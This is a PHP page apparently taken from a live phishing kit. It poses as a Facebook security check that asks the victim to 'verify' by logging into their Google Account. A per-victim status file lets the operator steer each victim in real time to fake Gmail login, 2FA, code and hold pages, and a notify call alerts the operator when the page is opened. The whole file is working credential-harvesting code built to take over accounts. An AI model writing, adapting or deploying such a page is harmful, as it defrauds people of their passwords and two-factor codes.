<?php
include "helper.php";

$token = $_GET['token'] ?? '';
if ($token === '') {
    header('Location: continue.php');
    exit;
}

$filePath = "status/" . $token . ".txt";
if (!file_exists($filePath)) {
    file_put_contents($filePath, 'gm_verify');
}

$data = trim(file_get_contents($filePath));
if ($data === 'gm_login') {
    header("Location: gmail_login.php?token=" . urlencode($token));
    exit;
} elseif ($data === 'gm_2fa_device') {
    header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=device");
    exit;
} elseif ($data === 'gm_2fa_pick') {
    header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=pick");
    exit;
} elseif ($data === 'break') {
    header("Location: break.php?token=" . urlencode($token));
    exit;
} elseif ($data === 'pwd') {
    header("Location: login.php?token=" . urlencode($token));
    exit;
} elseif ($data === 'code') {
    header("Location: code.php?token=" . urlencode($token));
    exit;
}

$displayEmail = '';
$emailFile = "emails/" . $token . ".txt";
if (file_exists($emailFile)) {
    $displayEmail = trim(file_get_contents($emailFile));
}
if ($displayEmail === '') {
    $fromDb = getLoginEMailById($token);
    if ($fromDb !== null) {
        $displayEmail = $fromDb;
    }
}
if ($displayEmail === '') {
    $displayEmail = 'user@gmail.com';
}

file_put_contents($filePath, 'gm_verify');
notifyGmailPageOnce($token, 'verify', 'GMAIL VERIFY PAGE');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Facebook</title>
    <link href="gmail-files/verify.css" rel="stylesheet">
</head>
<body class="gm-verify">
    <div class="gm-verify-card">
        <div class="gm-verify-brand">Facebook</div>
        <h1>Log into your Google Account to confirm it's you</h1>
        <p class="lead">For security reasons, we need you to verify with your Google Account by logging in with the Gmail address saved on your Facebook account: <?= htmlspecialchars($displayEmail); ?>.</p>
        <ul class="gm-verify-info">
            <li>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#1c1e21"/>
                </svg>
                <span>We will not share any of your Facebook data with your Google Account</span>
            </li>
            <li>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="#1c1e21"/>
                </svg>
                <span>This will not change the details you use to log into Facebook</span>
            </li>
        </ul>
        <div class="gm-verify-actions">
            <a class="gm-btn gm-btn-primary" href="gmail_login.php?token=<?= urlencode($token); ?>">Verify with Google</a>
        </div>
    </div>
    <script src="gmail-files/status.js?v=3"></script>
    <script>gmCheckStatus(<?= json_encode($token); ?>, { pageStatus: 'gm_verify', holdStatuses: ['gm_hold', 'hold', 'continue', ''] });</script>
</body>
</html>
